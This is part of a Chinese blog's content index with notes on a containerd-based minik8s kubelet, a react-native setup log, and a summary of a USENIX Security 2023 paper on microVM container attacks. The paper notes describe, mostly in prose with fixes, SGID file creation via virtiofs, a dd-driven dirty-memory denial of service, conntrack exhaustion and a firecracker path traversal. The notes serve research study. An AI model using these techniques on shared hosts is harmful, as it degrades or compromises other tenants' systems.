将容器进程绑定到指定cpu执行，比如<code>0-3</code>绑定到0 1 2 3  ，<code>1</code>绑定到1</li>\n<li><code>WithCPUCFS</code> 调度器，对应到nerdctl 是<code>--cpus</code> 会使用这个api，但是网上说这个参数指定cpu核，这个说法不准确，实际上如果这个值为1，会发生cpu0 和cpu1占用率都在50%的情况，即总使用量为1</li>\n<li><code>WithCPUShares</code> 份额</li>\n</ul>\n</li>\n<li><p>port: 仅作标识用，没有意义，所以没有对应api</p>\n<p><a href=\"https://www.jianshu.com/p/4b16c995990b\">k8s四种port解析：nodePort、port、targetPort、containerPort - 简书 (jianshu.com)</a> </p>\n</li>\n<li><p><code>WithContainerLabels</code>这个功能为container提供label</p>\n<p>配合<code>client.Containers(ctx,fmt.Sprintf(&quot;labels.%q==%s&quot;, &quot;pod&quot;, pod.Data.Name))</code>一起使用</p>\n<p>对于apiserver维护的信息，只是自定义的container apiobject，并不是containerd的可以用来获取真实容器信息的对象，使用containerd的添加label并使用filter的方法可以很方便地拿到一个pod对应的所有containers，否则需要通过遍历容器并比较ID来判断。</p>\n</li>\n</ul>\n<h3 id=\"task\"><a href=\"#task\" class=\"headerlink\" title=\"task\"></a>task</h3><p>containerd的api有一个docker没有的概念task</p>\n<p>每个容器创建后，可以开启task，每个task对应一个进程，有对应的api，这时候才会产生新的命名空间</p>\n<p>删除容器，先要killtask 然后delete task 最后delete容器</p>\n<h3 id=\"image\"><a href=\"#image\" class=\"headerlink\" title=\"image\"></a>image</h3><p>containerd本身管理容器运行时，对于其他功能的提供非常少，包括拉取镜像。使用containerd提供的api只能做到从某个registry拉取，本地image是不行的，不带registry的image也是不行的。</p>\n<p>通过观察nerdctl的源码可以得到以下两个扩展：</p>\n<ol>\n<li><code>pkg/imgutil/dockerconfigresolver/dockerconfigresolver.go/New</code>可知使用docker的resolver可以做到从不同registry(包括自己部署的)拉取镜像</li>\n<li><code>pkg/imgutil/imgutil.go/GetExistingImage</code>可知containerd提供<code>NewImage</code>方法，供<code>image.Image</code>对象到<code>containerd.Image</code>的转换，这里<code>image.Image</code>可以通过<code>client.ImageService().Get(imageName)</code>来获取。虽然这里在字符串解析上也必须出现registry的部分，但是实际上不会真的pull，而是从本地获取(<code>nerdctl image list</code>可见即可)</li>\n</ol>\n<p>如果image在自己部署的registry中但还未被pull，这两种方法都是行不通的，需要自己创建docker resolver然后用WithResolver的配置去pull。这里图方便，解决方案为先用cli工具提前pull，随后紧接着用方法2获取到image对象</p>\n<h3 id=\"pause\"><a href=\"#pause\" class=\"headerlink\" title=\"pause\"></a>pause</h3><p>用containerd api设置网络特别麻烦，因此直接用nerdctl跑pause容器，并inspect拿到pid</p>\n<p>因此这里直接使用podname+”-pause”为每个pause容器命名</p>\n<p>虽然containerd的container对象只能访问.ID，而nerdctl 的 <code>--name</code> 设置的是name并不是id 但还是可以通过containerd的filter+label拿到container对象</p>\n<p>然而由于一开始pause容器利用nerdctl实现网络配置，nerdctl本身除了调用containerd的api外，自己有维护一个namestore，在创建容器时会 <code>aquire</code> 需要在销毁时 <code>release</code></p>\n<p>所以销毁容器只调containerd的api是不够的，会导致containerd的容器已经被删掉了，但是nerdctl维护的信息还没删，导致下一次创建同名pause容器会有问题</p>\n<p>解决方案可以是照nerdctl的代码找到对应的文件路径 然后照抄 <code>release</code>的代码，但这导致minik8s存在与nerdctl耦合的路径配置，较复杂 所以不如销毁pause仍用nerdctl直接实现</p>\n<h2 id=\"network\"><a href=\"#network\" class=\"headerlink\" title=\"network\"></a>network</h2><p>containerd相较于docker并没有提供任何网络相关帮助，所以完全依赖CNI插件</p>\n<p><code>nerdctl network ls</code> <code>nerdctl run -net host/none</code></p>\n<p>CNI插件完成两个目标</p>\n<ol>\n<li>让每个容器(实际上就是一个pod)拥有一个虚拟网卡，使其拥有访问外网的能力</li>\n<li>支持跨node(物理主机)的pod间通信</li>\n</ol>\n<p><a href=\"https://blog.csdn.net/weixin_41033724/article/details/124976813\">Kubernetes容器网络及Flannel插件详解_边缘计算社区的博客-CSDN博客</a></p>\n<p>思路：</p>\n<ol>\n<li>使用flannel插件创建网络 此时每个node都会出现<code>flannel.1</code>的虚拟网卡，可以互相通信</li>\n<li>使用<code>nerdctl run -net flannel pause</code> 创建pause容器，此时ip在不同node上会在不同子网中进行分配，不会重复</li>\n<li>其他容器加入pause容器的network namespace</li>\n</ol>\n<h3 id=\"flannel\"><a href=\"#flannel\" class=\"headerlink\" title=\"flannel\"></a>flannel</h3><p><a href=\"https://github.com/flannel-io/flannel/blob/master/Documentation/running.md\">flannel&#x2F;running.md at master · flannel-io&#x2F;flannel · GitHub</a></p>\n<p>flannel目前已经支持了etcd v3版本，不需要切换v2。</p>\n<p>etcd v3 v2的数据是不互通的，flanneld启动时默认会在v3里找数据</p>\n<p><a href=\"https://www.cnblogs.com/lhang/p/17306765.html\">Docker容器使用Flannel通信 - L_Hang - 博客园 (cnblogs.com)</a></p>\n<p><a href=\"https://blog.csdn.net/weixin_30641567/article/details/123917486\">Containerd网络管理_containerd 端口映射_班婕妤的博客-CSDN博客</a></p>\n<p>只有master节点通过apiserver使用etcd，kubelet部署在node上 不需要也不能管理etcd</p>\n<p>只需要一个etcd 不需要集群 (flannel如果使用etcd集群会出找不到lease的bug)</p>\n<p>master <code>etcd --listen-peer-urls=&quot;http://192.168.1.12:2380,http://localhost:2380&quot; --listen-client-urls=&quot;http://192.168.1.12:2379,http://localhost:2379&quot; --initial-advertise-peer-urls=&quot;http://192.168.1.12:2380,http://localhost:2380&quot; --advertise-client-urls=&quot;http://192.168.1.12:2379,http://localhost:2379&quot;</code></p>\n<p>master <code>etcdctl --endpoints &quot;http://192.168.1.12:2379&quot; put /coreos.com/network/config &#39;&#123;&quot;NetWork&quot;:&quot;10.2.0.0/16&quot;,&quot;SubnetMin&quot;:&quot;10.2.1.0&quot;,&quot;SubnetMax&quot;: &quot;10.2.20.0&quot;,&quot;Backend&quot;: &#123;&quot;Type&quot;: &quot;vxlan&quot;&#125;&#125;&#39;</code></p>\n<p>node启动<code>./flanneld-amd64 -etcd-endpoints=http://192.168.1.12:2379 -iface=ens3</code></p>\n<p>这里ens3是主机上能和外界通信的网卡，如果不设置flannel也会自动找</p>\n<p>出现<code>flannel.1</code>的网卡。如果修改配置后第一次的flannel1无法消失 出现cni0 重启可以解决</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># vim /etc/cni/net.d/10-flannel.conflist</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"string\">&quot;name&quot;</span>: <span class=\"string\">&quot;flannel&quot;</span>,</span><br><span class=\"line\">  <span class=\"string\">&quot;cniVersion&quot;</span>: <span class=\"string\">&quot;0.3.1&quot;</span>,</span><br><span class=\"line\">  <span class=\"string\">&quot;plugins&quot;</span>: [</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"string\">&quot;type&quot;</span>: <span class=\"string\">&quot;flannel&quot;</span>,</span><br><span class=\"line\">      <span class=\"string\">&quot;delegate&quot;</span>: &#123;</span><br><span class=\"line\">        <span class=\"string\">&quot;isDefaultGateway&quot;</span>: <span class=\"literal\">true</span></span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"string\">&quot;type&quot;</span>: <span class=\"string\">&quot;portmap&quot;</span>,</span><br><span class=\"line\">      <span class=\"string\">&quot;capabilities&quot;</span>: &#123;</span><br><span class=\"line\">        <span class=\"string\">&quot;portMappings&quot;</span>: <span class=\"literal\">true</span></span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  ]</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><code>nerdctl run -d -v /home/test_mount:/root/test_mount --net flannel -e port=12345 mcastelino/nettools /root/test_mount/test_network</code> 测试网络可行<br>nerdctl对于网络的解析太复杂了，对于pause并没有很多额外的配置，所以直接用ctl启动pause<br>在加入pause的namespace后发现，虽然其他容器有通过虚拟网卡向外找到合适的转发接口的能力，但是并没有DNS server。这里解决方法是使用外部的<code>nerdctl cp</code>命令将首个容器(pause)的<code>/etc/resolv.conf</code> <code>/etc/hosts</code>文件复制给每个该pod下的容器<br>容器内部部署的服务 可在主机上通过容器ip+容器内端口的方式直接访问到，至此实现pod间通信、主机与pod通信，后续交给kube-proxy</p>\n<h3 id=\"原理\"><a href=\"#原理\" class=\"headerlink\" title=\"原理\"></a>原理</h3><p><a href=\"https://blog.csdn.net/weixin_43266367/article/details/127836595\">k8s网络插件之Flannel_林凡修的博客-CSDN博客</a></p>\n<h3 id=\"其他\"><a href=\"#其他\" class=\"headerlink\" title=\"其他\"></a>其他</h3><p>由于需要给pod增加dns服务，在master上使用coredns作为dns server，解决方法是在resolve.conf中第一条加入master节点的ip（必须53端口）</p>\n<p>resolv.conf的逻辑是 如果前一个nameserver连接不上，才会继续向下一个nameserver查找。</p>\n<p>如果前一个nameserver连接上了但是没有记录，则会直接报无记录，不会向下一个nameserver查找。</p>\n<p>因此必须保证在集群网络通常的情况下，master节点必须启用coredns并且coredns除了minik8s需要的dns服务，必须包括其他通用的dns服务。</p>\n<h2 id=\"资源监控\"><a href=\"#资源监控\" class=\"headerlink\" title=\"资源监控\"></a>资源监控</h2><p>参考<code>cmd/nerdctl/container_stats_linux.go</code></p>\n<p>可以通过containerd的api拿到metrics对象,不过需要Unmarshal，并且对应的接口离其报错，找不到type，只能照着containerd的源码手动用反射</p>\n<h3 id=\"memory\"><a href=\"#memory\" class=\"headerlink\" title=\"memory\"></a>memory</h3><p>是一个定值，表示占用内存大小，单位byte</p>\n<h3 id=\"CPU\"><a href=\"#CPU\" class=\"headerlink\" title=\"CPU\"></a>CPU</h3><p>进程创建开始之后累计执行的时间，如果跑在2个核上，过了1s，则记为2s<br>通过与上一次获取的cpu执行时间的delta和时间delta可以计算出CPUPercent，和top展示的cpu%是一模一样的<br>CPUPercent和容器创建指定的cpu参数可对应，例如指定cpu&#x3D;1，则cpu%&#x3D;100%;cpu&#x3D;2,cpu%&#x3D;200%（两核跑满）;cpu&#x3D;500m,cpu%&#x3D;50%</p>\n<h2 id=\"其他-1\"><a href=\"#其他-1\" class=\"headerlink\" title=\"其他\"></a>其他</h2><p>kubelet主要做三件事</p>\n<ol>\n<li>websocket与apiserver保持长连接，监听到pod的创建、销毁状态时进行对应的容器操作。</li>\n<li>作为http server接收对于容器资源的请求，获取并计算容器资源后返回。</li>\n<li>每隔一段时间检查所有容器的状态，将存在停止容器的pod的状态通过短链接更新给apiserver</li>\n</ol>\n<p>针对container，1是写，23是读，可能会发生冲突。例如操作2正在统计某容器资源的时候，该容器被操作1删除。</p>\n<p>使用读写锁为每个pod上锁，即<code>map[string]sync.RWMutex</code> 其中key为<code>namespace-podname</code> 锁必须细粒度，因为2操作非常慢。</p>\n<p>go的map本身是线程不安全的，在对于同一个pod同时拿锁时可能创建两个不同的锁，严重时可能导致对于map的修改崩溃，因此将map替换为<code>sync.Map</code>。虽然同时写map没问题，但是很可能出现t1创建完并拿完锁之后return t2再次创建并拿锁，原因是并没有另一把锁来让对于map中某个key的访问设为临界区。使用<code>sync.Map</code>提供的<code>LoadOrStore(key,value)</code>方法，它会先判断是否存在某个key，如果存在返回<code>map[key]</code>，否则设置<code>map[key]=value</code>后返回value，最后用value.lock。这个方法只是压缩代码行数到了两行，但仍然不是原子的。最好是有类似<code>tbb::concurrent_hash_map::accessor</code>之类的东西。</p>\n<p>解决方法是使用一把大锁保护<code>sync.Map</code>，每次写map都需要拿锁，虽然粒度从pod变大到了整个空间，但是这里锁保护的临界区非常小，之后对于map数据结构的写，很快。</p>\n<p>在和apiserver连接中断后，任务2会继续做，任务1会每5s再发起一次连接请求，任务3会按之前的频率继续做(由于get请求会失败所以拿不到pod信息)</p>\n","categories":["misc"]},{"title":"react-native 开发记录","url":"/2024/01/22/misc/react-native-note/","content":"<h1 id=\"react-native-开发记录\"><a href=\"#react-native-开发记录\" class=\"headerlink\" title=\"react-native 开发记录\"></a>react-native 开发记录</h1><h2 id=\"react-native-项目配置\"><a href=\"#react-native-项目配置\" class=\"headerlink\" title=\"react-native 项目配置\"></a>react-native 项目配置</h2><ul>\n<li><p>最新版0.68 要求jdk11 互联网课装好的是jdk8 所以使用0.66.4</p>\n<p>用intellij自动生成是最新版的，降级：</p>\n</li>\n</ul>\n<p><code>npm install --save react-native@0.66.4</code></p>\n<ul>\n<li><p>用intellij自动生成的 跑不了 会报少文件 用官网说的命令行方式新建项目<code>npx react-native init Project --version 0.66.4</code></p>\n<p>然而用命令行新建的项目再用intellij打开并不能识别 所以用vscode</p>\n</li>\n<li><p>安卓模拟器配置：<a href=\"https://reactnative.dev/docs/environment-setup\">https://reactnative.dev/docs/environment-setup</a></p>\n</li>\n<li><p>编译运行：<code>npx react-native run-android</code> (用vscode可以终端-运行任务)</p>\n</li>\n<li><p>打包发给手机：(android目录下)<code>gradlew assembleRelease</code></p>\n<p>apk路径：Project\\android\\app\\build\\outputs\\apk\\release</p>\n</li>\n<li><p>ios不像安卓这么容易，必须用Xcode，而Xcode又必须是mac环境</p>\n</li>\n</ul>\n<h2 id=\"package\"><a href=\"#package\" class=\"headerlink\" title=\"package\"></a>package</h2><p>包有互相依赖关系<br><code>npm install --legacy-peer-deps</code> 避免报错</p>\n<h3 id=\"导航\"><a href=\"#导航\" class=\"headerlink\" title=\"导航\"></a>导航</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&quot;@react-navigation/native&quot;: &quot;^6.0.10&quot;,</span><br><span class=\"line\">&quot;@react-navigation/stack&quot;: &quot;^6.2.1&quot;,</span><br></pre></td></tr></table></figure>\n<p>有如下依赖包</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&quot;react-native-gesture-handler&quot;: &quot;^2.5.0&quot;,</span><br><span class=\"line\">&quot;react-native-safe-area-context&quot;: &quot;^4.3.1&quot;,</span><br><span class=\"line\">&quot;react-native-safe-area-view&quot;: &quot;^1.1.1&quot;,</span><br><span class=\"line\">&quot;react-native-screens&quot;: &quot;3.13.1&quot;</span><br></pre></td></tr></table></figure>\n<h3 id=\"本地存储\"><a href=\"#本地存储\" class=\"headerlink\" title=\"本地存储\"></a>本地存储</h3><p><code>&quot;@react-native-community/async-storage&quot;: &quot;^1.12.1&quot;</code></p>\n<h3 id=\"antd\"><a href=\"#antd\" class=\"headerlink\" title=\"antd\"></a>antd</h3><p>antd-mobile不支持react native 换一个支持的</p>\n<p><a href=\"https://github.com/ant-design/ant-design-mobile-rn\">https://github.com/ant-design/ant-design-mobile-rn</a></p>\n<p><a href=\"https://rn.mobile.ant.design/\">https://rn.mobile.ant.design/</a></p>\n<p><code>&quot;@ant-design/react-native&quot;: &quot;5.0.0&quot;</code></p>\n<p>依赖包(issue中发现)<br><code>npm install classnames rc-util fbjs</code></p>\n<p>但实际上移动端的antd实现的组件并不如web端那么丰富，很多时候react-native自带的组件已经挺不错了</p>\n<h3 id=\"webrtc\"><a href=\"#webrtc\" class=\"headerlink\" title=\"webrtc\"></a>webrtc</h3><p><a href=\"https://github.com/react-native-webrtc/react-native-webrtc\">https://github.com/react-native-webrtc/react-native-webrtc</a></p>\n<p>下这个包会很慢，需要耐心等</p>\n<p>启动有问题，不报任何错误 在issue中找到解决方法，修改安卓文件配置即可</p>\n<p><a href=\"https://github.com/react-native-webrtc/react-native-webrtc/issues/1080\">https://github.com/react-native-webrtc/react-native-webrtc/issues/1080</a></p>\n<p>针对安卓的权限问题解决如下</p>\n<p><a href=\"https://github.com/react-native-webrtc/react-native-webrtc/blob/master/Documentation/AndroidInstallation.md\">https://github.com/react-native-webrtc/react-native-webrtc/blob/master/Documentation/AndroidInstallation.md</a></p>\n<h3 id=\"simple-peer\"><a href=\"#simple-peer\" class=\"headerlink\" title=\"simple peer\"></a>simple peer</h3><p><a href=\"https://github.com/feross/simple-peer\">https://github.com/feross/simple-peer</a></p>\n<p>simple-peer并没有说是支持移动端的，但是可以根据如下方法直接使用<br><a href=\"https://stackoverflow.com/questions/66281342/simple-peer-with-react-native-webrtc\">https://stackoverflow.com/questions/66281342/simple-peer-with-react-native-webrtc</a></p>\n<p>遇到的问题在于，react-native-webrtc中的RTCPeerConnection还没有实现很多API，因此在使用的时候会直接报错。</p>\n<p><a href=\"https://github.com/react-native-webrtc/react-native-webrtc/pull/1160\">https://github.com/react-native-webrtc/react-native-webrtc/pull/1160</a><br>此PR增加API 但仍在开发中</p>\n<p>若此后遇到问题，可尝试更换框架为peerjs</p>\n<p><a href=\"https://github.com/Zemke/react-native-peerjs\">https://github.com/Zemke/react-native-peerjs</a></p>\n<p><a href=\"https://peerjs.com/docs/#api\">https://peerjs.com/docs/#api</a></p>\n<h3 id=\"crypto\"><a href=\"#crypto\" class=\"headerlink\" title=\"crypto\"></a>crypto</h3><p><a href=\"https://github.com/tradle/react-native-crypto\">https://github.com/tradle/react-native-crypto</a></p>\n<p>最后一句换成<code>node_modules\\.bin\\rn-nodeify --hack --install --legacy-peer-deps</code><br>默认的crypto库的方法是基于浏览器内核的，在react-native项目中会报错(例如randomBytes)，使用react-native-randombytes并不能直接解决问题。</p>\n<p>安装react-native-crypto后根据教程进行配置，可以使其替代原有的crypto而不用修改其他库的源代码。(simple-peer中实例化Peer遇到此问题)</p>\n<p>之后package.json中会出现很多奇奇怪怪的包</p>\n<h2 id=\"一些错误\"><a href=\"#一些错误\" class=\"headerlink\" title=\"一些错误\"></a>一些错误</h2><p>出现任何错误 通用解决方案：</p>\n<ol>\n<li>重启metro</li>\n<li>node_modules删了再装</li>\n<li>重启电脑</li>\n</ol>\n<ul>\n<li><pre><code>npm ERR! Error: read ECONNRESET\nnpm ERR!     at TLSWrap.onStreamRead (node:internal/stream_base_commons:217:20) &#123;\nnpm ERR!   errno: -4077,\nnpm ERR!   code: &#39;ECONNRESET&#39;,\nnpm ERR!   syscall: &#39;read&#39;\nnpm ERR! &#125;\n</code></pre>\n<p>这个是网络不好 可以多试几次  或者用cnpm 或者换源</p>\n</li>\n<li><p><code>could not get batchedbridge</code> 重启metro</p>\n</li>\n<li><p><code>Invariant Violation: Module AppRegistry is not a registered callable module (calling runApplication)</code>重启metro</p>\n</li>\n<li><p><code>npm ERR! could not determine executable to run</code>仔细看命令 npm莫名其妙会变成npx</p>\n</li>\n<li><p><code>module could not be found within the project or in these directories:node_modules</code> 重启metro 如果不行删了node_modules再装</p>\n</li>\n<li><p><code>warn No apps connected. Sending &quot;reload&quot; to all React Native apps failed. Make sure your app is running in the simulator or on a phone connected via USB. info Reloading app...</code><br>这个的原因是app本身有问题 导致一打开就会闪退 或者其他原因根本打不开 和模拟器的连接没有问题  但是找不到任何报错的信息 因此只能控制变量去看;<br>少装几个包就没这个问题了 因此是装了的包 即使代码里没有用 也会导致这个问题;具体是react-native-webrtc要求安卓的minSdkVersion 需要修改android目录下的配置文件</p>\n</li>\n<li><p><code>&#39;react-native&#39; 不是内部或外部命令，也不是可运行的程序 或批处理文件。</code>这个可能是uninstall的时候多删东西了 直接<code>npm install</code>就行</p>\n</li>\n<li><p><code>TypeError: undefined is not an object (evaluating &#39;process.version.split&#39;)</code>这个问题并没有解决</p>\n<p><a href=\"https://github.com/facebook/react-native/issues/30654\">https://github.com/facebook/react-native/issues/30654</a></p>\n</li>\n</ul>\n<h2 id=\"待解决的问题\"><a href=\"#待解决的问题\" class=\"headerlink\" title=\"待解决的问题\"></a>待解决的问题</h2><ul>\n<li><p>使用路由后导致页面卡死</p>\n</li>\n<li><p>某些手机下载软件后网络请求错误  可能是手机版本导致禁用了http 可能https可以解决</p>\n<p><a href=\"https://blog.csdn.net/qq_32312317/article/details/80868118\">React Native: TypeError: Network request failed_翻船现场的博客-CSDN博客</a></p>\n<p><a href=\"https://github.com/facebook/react-native/issues/32931\">HTTP Fetch fails with “TypeError: Network request failed” &#x3D;&gt; Resolved · Issue #32931 · facebook&#x2F;react-native (github.com)</a></p>\n</li>\n</ul>\n","categories":["misc"]},{"title":"Operation Forwarding","url":"/2024/01/23/papers/forward/","content":"<h1 id=\"Operation-Forwarding\"><a href=\"#Operation-Forwarding\" class=\"headerlink\" title=\"Operation Forwarding\"></a>Operation Forwarding</h1><p>usenix security23</p>\n<p>虽然使用硬件虚拟化进行了隔离 但是microVM使用的组件还是会涉及到使用host的资源</p>\n<p>策略1 container components</p>\n<ul>\n<li>kata container 用viriofs 提供rootfs 使得guest在这个文件夹的操作会转发到host</li>\n<li>firecracker用runc jailer先在host上创建文件夹 然后复制文件 作为rootfs 使得host普通用户可以通过创建microVM利用containerd的漏洞做坏事</li>\n</ul>\n<blockquote>\n<p>however, virtiofs is designed to offer local file system semantics and high performance. The file system performance downgrades without virtiofs in Kata Containers   </p>\n</blockquote>\n<p>用这个是为了性能</p>\n<p>策略2 device emulator</p>\n<p>策略3 host kernel module</p>\n<h2 id=\"1-kata-container-virtiofs\"><a href=\"#1-kata-container-virtiofs\" class=\"headerlink\" title=\"1 kata container virtiofs\"></a>1 kata container virtiofs</h2><ol>\n<li><p>container 在virtiofs的共享文件夹下创建SGIDbit的可执行文件  SGID可以临时获得程序所属组的权限</p>\n</li>\n<li><p>guest的virtiofs-driver会把open的system call forward给host的virtiofs daemon</p>\n</li>\n<li><p>通过host创建文件的权限检查 因为virfiofs daemon有root为 supplemental group</p>\n<blockquote>\n<p>Then it checks if the creation process has the same supplemental group as the directory owner. However, according to the virtiofs daemon’s document [31], virtiofs daemon must run as the root user and has the root group in its supplemental group  </p>\n</blockquote>\n</li>\n<li><p>成功在host的某个目录下创建一个SGID的可执行文件</p>\n</li>\n</ol>\n<p>vm内部和host是两个世界，所以这里无论怎么样vm还是无法利用这个可执行文件完成逃逸的。但是这个文件为host留了隐患，在host同一物理机器的任何普通用户都可以以root权限执行这个可执行文件。</p>\n<blockquote>\n<p>a regular user can get the host root group privileges when executing the file created by the malicious container.  </p>\n</blockquote>\n<p>cve的描述:</p>\n<blockquote>\n<p> This could allow a malicious unprivileged user inside the guest to gain access to resources accessible to the root group, potentially escalating their privileges within the guest. A malicious local user in the host might also leverage this unexpected executable file created by the guest to escalate their privileges on the host system.</p>\n</blockquote>\n<ol>\n<li>guest内部的非root用户有root权限</li>\n<li>host的非root用户有root权限</li>\n</ol>\n<p>报告给viriofs CVE 修复：取消掉viriofs 的root group</p>\n<p><a href=\"https://lists.nongnu.org/archive/html/qemu-devel/2022-01/msg05364.html\">https://lists.nongnu.org/archive/html/qemu-devel/2022-01/msg05364.html</a></p>\n<p>这个patch是qemu的virtiofsd  直接在启动的一开始把这个进程的所有supplemental group 都清空了 </p>\n<p>一个用户可以属于多个组 但是登录的时候默认是primary group</p>\n<p>其他组都是supplemental group</p>\n<blockquote>\n<p>If we have membership of “root” supplementary group</p>\n</blockquote>\n<p>root group是不是只是一个形象的表达？ 实际上只有adm sudo这种group</p>\n<p>如果viriofs共享的文件夹是root 那么清空了virtiofsd的root supplemental group virtiofsd本身还怎么提供服务？最早为什么必须加？涉及到viriofs的设计 不深入研究</p>\n<p><strong>利用open  策略1</strong></p>\n<h2 id=\"2-kata-container-dirty-memory-attack\"><a href=\"#2-kata-container-dirty-memory-attack\" class=\"headerlink\" title=\"2 kata container dirty memory attack\"></a>2 kata container dirty memory attack</h2><ol>\n<li>container中<code>dd if=/dev/zero of=/mnt/test bs=1M count=4096 oflag=direct  </code>持续生成 写文件</li>\n<li>viriofs共享文件夹写write  VFS-&gt;viriofs driver-&gt;host viriofs daemon 触发host写 影响host dirty memory</li>\n<li>linux kernel 维护一个值 当dirty memory超过阈值后(20%) 所有进程的写操作会从write-back变成write-through 性能下降</li>\n<li>当多个container做这种操作 host的io性能可以下降90%</li>\n</ol>\n<p><strong>利用write 策略1</strong></p>\n<blockquote>\n<p>Besides, one can limit dirty memory usage of the virtiofs by adding the virtiofs daemon into cgroups.  </p>\n</blockquote>\n<p>virtiofs daemon就一个 给哪个vm的cgroup？</p>\n<p>virtiofs团队正在努力让virtiofs daemon不需要以root运行 并且不影响用户使用</p>\n<p><strong>经过测试 当某个文件被删除后 这个文件的buffer 即所有的dirty page也会马上被清空 不会再占用内存 所以仅仅靠一个container是无法达成攻击的 需要多个container一起 例如10container*4G&gt;192G(server)*20%&#x3D;38.4G</strong></p>\n<p>多个container持续修改同一个文件即可 这样持续生成dirty memory</p>\n<p>dirty memory在代码中的定义：</p>\n<p><a href=\"https://www.cnblogs.com/gmpy/p/12657801.html\">Linux 脏数据回刷参数与调优 - 广漠飘羽 - 博客园 (cnblogs.com)</a></p>\n<p>可回收内存(FILE_DIRTY) &gt; 可用内存(FREE+INACTIVE_FILE+ACTIVE_FILE) * ratio 发生回收 所以大量的匿名页是不记入的</p>\n<h2 id=\"3-kata-container-nf-conntrack-table-attack\"><a href=\"#3-kata-container-nf-conntrack-table-attack\" class=\"headerlink\" title=\"3 kata container nf_conntrack table attack\"></a>3 kata container nf_conntrack table attack</h2><ol>\n<li>container 疯狂connect 建立tcp连接</li>\n<li>host的vhost-net kernel module调用tun_sendmsg-&gt;nf_conntrack_alloc</li>\n<li>达到nf_conntrack_max 类似抽象资源攻击</li>\n<li>造成随机丢包   ping 50%丢包 nginx不可用</li>\n</ol>\n<p>这里应该攻击的就是最终使用nf_conntrack table的网络使用者 也就是同样使用vhost-net的其他容器</p>\n<p><strong>connect 策略3</strong></p>\n<p>kata不修复 就给了减弱攻击的做法</p>\n<p><a href=\"https://security.stackexchange.com/questions/43205/nf-conntrack-table-full-dropping-packet/43220#43220\">https://security.stackexchange.com/questions/43205/nf-conntrack-table-full-dropping-packet/43220#43220</a></p>\n<p>调一些参数 比如timeout max</p>\n<p>可以限制速率</p>\n<p><a href=\"https://lonesysadmin.net/2013/12/22/better-linux-disk-caching-performance-vm-dirty_ratio/\">https://lonesysadmin.net/2013/12/22/better-linux-disk-caching-performance-vm-dirty_ratio/</a></p>\n<h2 id=\"4-attack-of-vhost-net-kernel-module\"><a href=\"#4-attack-of-vhost-net-kernel-module\" class=\"headerlink\" title=\"4 attack of vhost-net kernel module\"></a>4 attack of vhost-net kernel module</h2><ol>\n<li>container 疯狂 sendmsg&#x2F;recvmsg</li>\n<li>kernel 疯狂handle_rx&#x2F;tx</li>\n<li>vhost kernel worker thread使用很多cpu资源 且不计入VM使用的资源</li>\n</ol>\n<p>并没有显示对其他container有影响</p>\n<blockquote>\n<p>Specifically, a worker thread called vhost-<owner-device-emulator-process-pid> is created for each virtual machine  </p>\n</blockquote>\n<p><strong>sendmsg&#x2F;recvmsg 策略3</strong></p>\n<p>每个VM一个 所以解决方案是把这些thread加入container的cgroup</p>\n<p>实际上对于kata container 有一个sandbox_cgroup_only&#x3D;true的选项可以让vhost thread放入cgroup 但是默认是false</p>\n<p>为什么这个可以让container的用户自己配置？ 那都是false不是不需要消耗资源付更多钱吗</p>\n<p>可以用SRIOV</p>\n<h2 id=\"5-firecracker-containerd-escalation\"><a href=\"#5-firecracker-containerd-escalation\" class=\"headerlink\" title=\"5  firecracker-containerd escalation\"></a>5  firecracker-containerd escalation</h2><p><a href=\"https://github.com/firecracker-microvm/firecracker-containerd/commit/95c43cdec1b5dc92a16a732b56f482218c2b5fed\">https://github.com/firecracker-microvm/firecracker-containerd/commit/95c43cdec1b5dc92a16a732b56f482218c2b5fed</a></p>\n<ol>\n<li><p>host 普通用户构造一个路径 申请创建microVM</p>\n</li>\n<li><p>firecracker-containerd是root权限运行 而代码中并没有检查参数所以涉及到的chown和create可以操作任何文件</p>\n<p>并且代码使用的filepath.join会导致组合的路径逃出jail</p>\n</li>\n<li><p>chown可以任意修改文件权限</p>\n<p>create可以任意清空文件，例如清空host的.so 让host crash</p>\n</li>\n</ol>\n<p><strong>CreateVM 策略1</strong></p>\n<p>“path&#x2F;filepath”  filepath.join 在某一个路径存在<code>/../../../</code>的情况下 最后组合的路径会把另一个前面的吃掉</p>\n<p>换成”github.com&#x2F;containerd&#x2F;continuity&#x2F;fs” fs.RootPath</p>\n<p>用户控制一个 可以逃出runc指定的jail路径</p>\n<p><strong>CreateVM 策略1</strong></p>\n<h2 id=\"6-firecracker-based-container-dirty-memory-attack\"><a href=\"#6-firecracker-based-container-dirty-memory-attack\" class=\"headerlink\" title=\"6 firecracker-based container dirty memory attack\"></a>6 firecracker-based container dirty memory attack</h2><p>类似kata container</p>\n<p>但是firecracker使用的是virio-blk</p>\n<p><strong>write 策略2</strong></p>\n<h2 id=\"7-Firecracker-based-Container-Nf-conntrack-TableAttack\"><a href=\"#7-Firecracker-based-Container-Nf-conntrack-TableAttack\" class=\"headerlink\" title=\"7 Firecracker-based Container Nf_conntrack TableAttack\"></a>7 Firecracker-based Container Nf_conntrack TableAttack</h2><p>用virtio-net device 而不是kernel module</p>\n<p>但是效果一样</p>\n<p><strong>connect 策略2</strong></p>\n<p>被AWS修复了  没找到怎么修复</p>\n<h2 id=\"8-KVM-PIT-Timer-Attack\"><a href=\"#8-KVM-PIT-Timer-Attack\" class=\"headerlink\" title=\"8 KVM PIT Timer Attack\"></a>8 KVM PIT Timer Attack</h2><ol>\n<li>guest疯狂写某写io port 触发PIT timer 且period很短</li>\n<li>host调度kvm-pit线程 pit_do_work往guest插入中断</li>\n<li>内核线程属于root cgroup 消耗资源不算在user space</li>\n<li>cpu memory io的benchmark性能都下降</li>\n</ol>\n<p>个人认为这里是server的资源并不多 并且开的container太多 导致消耗大量资源的PIT thread在整体可用资源的占比变高</p>\n<p><strong>outb 策略3</strong></p>\n<p>qemu用HPET代替了PIT 具体实现不深入研究</p>\n<p>也是一个VM一个 